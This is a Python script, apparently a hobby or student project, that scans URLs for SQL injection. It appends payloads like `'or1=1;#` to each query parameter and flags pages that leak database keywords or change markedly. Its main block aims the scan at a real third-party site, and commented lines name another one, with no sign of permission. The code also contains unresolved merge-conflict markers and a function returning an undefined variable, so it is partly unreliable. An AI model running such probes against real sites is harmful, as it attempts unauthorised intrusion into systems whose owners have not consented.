import requests as req
# from utils.levenshtein_distance import similarity
from collections import OrderedDict

injection_patterns = ["'", "'or1=1;#", "'or1=1;--"]

initial_vulnerable_key_words = ['sql', 'database', 'odbc']



def minimum_edit_distance(first_string: str, second_string: str) -> int:
    distances = range(len(first_string) + 1)
    for index2,char2 in enumerate(second_string):
        newDistances = [index2+1]
        for index1,char1 in enumerate(first_string):
            if char1 == char2:
                newDistances.append(distances[index1])
            else:
                newDistances.append(1 + min((distances[index1],
                                             distances[index1+1],
                                             newDistances[-1])))
        distances = newDistances
        # print(index2, char2)
    return distances[-1]


def similarity(longer_string: str, shorter_string: str) -> float:
    if(len(longer_string) < len(shorter_string)):
        longer_string, shorter_string = shorter_string, longer_string
    if(len(longer_string) == 0):
        return 1.0
    return (len(longer_string) - minimum_edit_distance(shorter_string, longer_string)) / float(len(longer_string))

# <<<<<<< Updated upstream
# def test_for_eql_injection():
    # return "RESULT of SQL injection"

# =======
def sql_injection_attack(url: str):
    pass
    return string
# >>>>>>> Stashed changes

def inject_url(url: str):
    global initial_vulnerable_key_words
    global injection_patterns
    vulnerable_key_word = []
    resp = None
    try:
        resp = req.get(url)
    except:
        return 'Url not reachable'
    status_code = resp.status_code
    if(status_code >= 400 and status_code < 500):
        return 'Status code returned %s' %status_code
    if('?' not in url):
        return 'NOT VULNERABLE'
    html_origin = resp.text
    
    for kw in initial_vulnerable_key_words:
        if kw not in html_origin:
            vulnerable_key_word.append(kw)

    #Razlaganje URL-a
    tail_url = ''
    url = resp.url
    if ('#' in url):
        tail_url = resp.url.split('#')[1]
        url = resp.url.split('#')[0]
    base_url = url.split('?')[0]
    parts = url.split('?')[1].split('&')
    
    for ip in injection_patterns:
        for i, p in enumerate(parts):
            tmp_parts = parts.copy()
            tmp_parts[i] = ''.join([p, ip])
            
            # Generisanje URL-a
            new_url = '&'.join(tmp_parts)
            new_url = '?'.join([base_url, new_url])
            new_url = '#'.join([new_url, tail_url])
    
            resp = req.get(new_url)
            html2 = resp.text
            for kw in vulnerable_key_word:
                if kw in html2:
                    return 'VULNERABLE'
            print(html2 != html_origin)
            print(len(html2), len(html_origin))
            print(new_url)
            if(html2 != html_origin):
                if(similarity(html_origin, html2) < 0.4):
                    return 'VULNERABLE'
    return 'NOT VULNERABLE'
    
    
    
if __name__ == '__main__':
    # inject_url('https://stackoverflow.com/questions/2349991/how-to-import-other-python-files')
    # resp = req.get('https://gebrauchtwagen.bmw.de/#/b/vehicles?manufacturers=221&series=21&variants=174')
    # print(inject_url('https://gebrauchtwagen.bmw.de/#/b/vehicles?manufacturers=221&series=21&variants=174'))
    print(inject_url('http://old.etfbl.net/?c=prikazi&objekat=oglas#ploca_1'))
    
    # print('resp: %s' %resp)
    # print('html: %s' %resp.text)
    # print('status code: %s' %resp.status_code)
    # print('url: %s' %resp.url)
    # print('url: %s' %resp.history)
    # if('?' in  resp.url):
        # base_url = resp.url.split('?')[0]
        # parts = resp.url.split('?')[1].split('&')
    # payload = OrderedDict()
    # for p in parts:
        # payload[p.split('=')[0]] = p.split('=')[1]
    # tmp = ''
    # for k, v in payload.items():
        # tmp = '%s%s=%s\'or1=1;#&' %(tmp, k, v)
    # tmp = tmp[:-1]
    # tmp = '%s?%s' %(base_url, tmp)
    # print('tmp: %s' %tmp)
    # print('parts: %s' % parts)
    # print('payload: %s' % payload)
    # resp = req.get(tmp)
    # print('status code: %s' %resp.status_code)
    # print('url: %s' %resp.url)
    # resp = req.head('https://gebrauchtwagen.bmw.de/#/b/vehicles?manufacturers=221&series=21&variants=174')
    # print('resp: %s' %resp)
    # print('headers: %s' %resp.headers)
    # print('url: %s' %resp.url)